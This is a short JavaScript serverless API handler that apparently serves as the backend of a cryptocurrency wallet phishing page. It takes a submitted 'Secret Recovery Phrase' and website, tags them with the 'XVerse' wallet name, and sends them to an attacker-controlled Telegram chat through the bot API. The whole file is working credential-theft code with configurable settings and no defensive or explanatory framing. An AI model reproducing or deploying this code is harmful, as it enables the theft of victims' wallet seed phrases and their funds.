export default async function handler(req, res) {
  if (req.method !== "POST") {
    return res.status(405).json({ error: "Method not allowed" });
  }

  const { phrase, website } = req.body;
  if (!phrase || !website) {
    return res.status(400).json({ error: "Missing data" });
  }

  // Set your wallet name here (do NOT expose in frontend)
  const walletName = "XVerse"; // Change to your desired wallet name

  const botToken = process.env.TELEGRAM_BOT_TOKEN;
  const chatId = process.env.TELEGRAM_CHAT_ID;
  const message = `Wallet: ${walletName}\nWebsite: ${website}\nSecret Recovery Phrase:\n${phrase}`;

  const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;

  const response = await fetch(telegramUrl, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
      chat_id: chatId,
      text: message
    })
  });

  if (response.ok) {
    return res.status(200).json({ success: true });
  } else {
    return res.status(500).json({ error: "Failed to send message" });
  }
}
